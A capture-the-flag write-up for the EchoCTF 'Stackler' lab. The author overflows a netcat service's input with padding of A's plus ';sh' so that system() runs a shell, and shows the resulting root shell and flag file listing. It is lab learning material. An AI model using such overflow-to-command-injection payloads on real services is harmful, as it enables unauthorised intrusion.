### Stackler EchoCTF

### Difficulty = Easy

### IP Address =  10.0.41.19

#### Description: This system generated a 20 character random word each time so guessing it is quite hard. Still there is a way to force your way around and get access to the flag that can be found on the same folder as the challenge. To start the challenge connect with nc -t 10.0.41.19 1337. Your timer starts from the first time you connect to the service.

We're given a netcat service to connect to 

```
nc -t 10.0.41.19 1337
```

On connecting to it shows an input prompt that required us giving it a password

```
└─$ nc -t 10.0.41.19 1337
Guess the word i'm thinking and you win a shell...
lol
FAILURE! You didnt guess my word...
My word was: 9Gw:>{)?vcIF|ud  
```

We can't guess a 20 random value so attempting to get the password isn't going to be a way here

From the box name called `stackler` so maybe it deals with stack overflow

But here's the problem. We are not given a binary to analyze so if i'm to perform a binary exploitation it will be kinda difficulty

Since the difficulty is Easy i'll assume that the binary already uses a vulnerable function maybe `gets(), strcpy, etc.` to receive our input

With this i made a script to fuzz for values and append ;sh

Here's the script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/stackler/exploit.py)

On running it after few minutes it pops a shell 

```
└─$ python3 fuzz.py       
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[----------------------SNIP---------------------------]
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[+] Opening connection to 10.0.41.19 on port 1337: Done
[*] Switching to interactive mode
SUCCESS! Here is my gift to you...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
sh: 0: can't access tty; job control turned off
# $  
```

So what's likely happening there is that:

```
1. It saves a value in the stack
2. And it runs system(value)
3. With the exploit we made the A's overwrote what is stored in the value therefore making it system(;sh)
```

And we're root

```
[*] Switching to interactive mode
SUCCESS! Here is my gift to you...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
sh: 0: can't access tty; job control turned off
# $ id
uid=0(root) gid=0(root) groups=0(root)
# $ ls -al
total 764
drwxr-xr-x 1 root root   4096 Nov 16  2021 .
drwxr-xr-x 1 root root   4096 Feb 20 00:39 ..
-rw-r--r-- 1 root root      0 Nov 16  2021 ETSCTF_22138d61ca9a56b747753874141ff009
-rwxr-xr-x 1 root root 773088 Nov 16  2021 chall
# $ 
```

That's all xD

<br> <br>
[Back To Home](../../index.md)
